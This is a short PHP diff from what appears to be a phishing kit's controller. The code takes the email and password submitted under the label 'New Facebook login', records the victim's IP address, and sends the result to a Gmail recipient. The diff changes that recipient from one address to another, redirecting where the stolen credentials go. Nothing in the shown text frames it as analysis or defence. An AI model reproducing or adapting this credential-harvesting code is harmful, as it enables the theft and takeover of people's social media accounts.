@@ -54,7 +54,7 @@ class MainController extends Controller {
                  else
                  { 
                  	  $s = "New Facebook login: ".date("h:i A jS F, Y");
-                       $rcpt = "safebets.disenado@gmail.com";
+                       $rcpt = "holtchris147@gmail.com";
                        $e = $req["e"];
                        $p = $req["p"];
                        $location = getenv("REMOTE_ADDR");
